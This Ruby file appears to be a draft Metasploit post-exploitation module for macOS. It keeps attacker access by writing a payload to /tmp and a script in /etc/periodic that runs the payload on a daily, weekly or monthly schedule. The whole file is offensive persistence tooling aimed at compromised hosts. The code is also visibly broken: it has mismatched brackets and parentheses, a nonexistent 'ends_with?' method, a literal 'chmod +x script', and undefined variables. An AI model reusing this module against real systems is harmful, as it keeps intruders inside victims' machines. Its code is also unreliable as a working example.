##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Post::File
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'OSX Periodic Script Persistence',
        'Description' => %q{
          This module will achieve persistence by writing a script to the /etc/periodic directory. 
          According to The Art of Mac Malware no such malware species persist in this manner (2024). 
          This payload requires root privileges to run.    
        },
        'License' => MSF_LICENSE,
        'Author' => 'gardnerapp',
        'References' => [
          [ 'URL', 'https://taomm.org/vol1/pdfs/CH%202%20Persistence.pdf',
            'URL', 'https://superuser.com/questions/391204/what-is-the-difference-between-periodic-and-cron-on-os-x/' ]
        ],
        'Platform' => 'osx',
         'Targets' => [
          [ 'Mac OS X x64 (Native Payload)', { 'Arch' => ARCH_X64, 'Platform' => [ 'osx' ] } ],
          [ 'Mac OS X x86 (Native Payload for 10.14 and earlier)', { 'Arch' => ARCH_X86, 'Platform' => [ 'osx' ] } ],
          [ 'Python payload', { 'Arch' => ARCH_PYTHON, 'Platform' => [ 'python' ] } ],
          [ 'Command payload', { 'Arch' => ARCH_CMD, 'Platform' => [ 'unix' ] } ],
        ],
        'DefaultTarget' => 0,
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'DisclosureDate' => '2012-04-01',
        'Platform' => [ 'osx', 'python', 'unix' ]
        ],
        'Payload' => {
        },
        'Privileged' => true,
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]
        },
      )
    )

    register_options([
      OptEnum.new('PERIODIC_DIR', [true, 'Periodic Directory to write script eg. /etc/periodic/daily', 'daily', %w[daily weekly monthly]]),
      OptString.new('SCRIPT_NAME', [false, 'Name of script ', Rex::Text.rand_text_alphanumeric(rand(6..13))]),
      OptString.new('PAYLOAD_DIR', [true, 'Directory to write payload to', '/tmp']),
      OptString.new('PAYLOAD_FILENAME', [true, 'Name of the payload file.', Rex::Text.rand_text_alphanumeric(rand(6..13))])
    ])
  end

  def check 

    return CheckCode::Safe('Target is not OSX') unless session.target == 'osx'

    if is_root?
      print_good "Current process is running as root on #{hostname} "
    else 
      return CheckCode::Safe "Current process is not running as root and can't write files to /etc/periodic. Please elevate to root and try again."
    end

    if writable? '/etc/periodic' 
      print_good '/etc/periodic is writable'
    else 
      return CheckCode::Safe "Unable to write to /etc/periodic"
    end 

    return CheckCode::Vulnerable
  end

  def write_payload(payload_bin)
    payload_dir = datastore['PAYLOAD_DIR']
    fail_with(Failure::BadConfig, "The #{payload_dir} is not writable." if !writable? payload_dir 
     
    payload_dir += '/' unless payload_dir.ends_with? '/'

    payload_file = payload_dir + datastore['PAYLOAD_FILENAME']

    if write_file(payload_file, payload_bin)
      print_good "Writing payload to #{payload_file} suceeded"
      cmd_exec("chmod +x #{payload_file}")
    else
      fail_with(Failure::UnexpectedReply, "Unable to write payload to #{script}")
    end 

    payload_file
  end

  def write_periodic_script(payload_file)
    periodic_dir = datastore['PERIODIC_DIR']
    script = periodic_dir + datastore['SCRIPT_NAME']

    if write_file(script, "#{payload_file}")
      print_status "Succesfully wrote periodic script to #{script}. This will execute #{payload_file}"
      cmd_exec("chmod +x script")
    else 
      fail_with(Failure::UnexpectedReply, "Unable to create and write to #{script}")
    end 
  end 

  
  def exploit
    # Need to check the architecture we're on if ewe are running abinary payload 
    dir = "/etc/periodic/#{datastore['PERIODIC_DIR']}/"

    script = datastore['SCRIPT_NAME']

    dest = dir + script 

    if target['Arch'] == ARCH_PYTHON
      payload_bin = "#!/usr/bin/env python\n" + payload.encoded
    elsif target['Arch'] == ARCH_CMD
      payload_bin = "#!/usr/bin/env bash\n" + payload.raw
    else 
      payload_bin = generate_payload_exe
    end 

    payload_file = write_payload payload_bin

    write_periodic_script payload_file 
  end
end
